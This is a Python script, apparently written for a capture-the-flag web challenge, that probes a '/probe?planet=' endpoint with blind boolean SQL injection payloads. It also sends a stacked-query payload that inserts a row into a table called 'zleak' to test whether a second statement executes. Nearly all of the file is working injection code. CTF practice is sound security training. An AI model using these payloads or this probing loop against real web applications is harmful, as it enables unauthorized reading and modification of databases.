"""Stacked-query probe: can the injection run a second statement?

zleak is an empty one-column table whose name means "leak" -- the author put it there
as a landing zone. If a second statement executes, the row count changes and the very
next boolean probe sees it.
"""
import sys
import time
import urllib.parse
import urllib.request

BASE = "https://planetary.web.2026.sunshinectf.games"


def probe(planet):
    url = BASE + "/probe?planet=" + urllib.parse.quote(planet, safe="")
    for _ in range(3):
        try:
            with urllib.request.urlopen(url, timeout=90) as r:
                b = r.read().decode("utf-8", "replace")
        except Exception:
            time.sleep(3)
            continue
        return "carrier" if "is-carrier" in b else "null"
    return "ERR"


def bit(expr):
    for _ in range(3):
        if probe("MARS' AND (%s)-- -" % expr) == "carrier":
            return True
        time.sleep(1.5)
    return False


STMTS = ["MARS'; INSERT INTO zleak DEFAULT VALUES-- -"]

if __name__ == "__main__":
    cnt = "(SELECT COUNT(*) FROM zleak)"
    print("[*] zleak rows before      : %s" % bit("%s>0" % cnt), flush=True)
    for s in STMTS:
        print("[*] sending stacked stmt : %s -> %s" % (s, probe(s)), flush=True)
        time.sleep(2)
    print("[*] zleak rows after       : %s" % bit("%s>0" % cnt), flush=True)
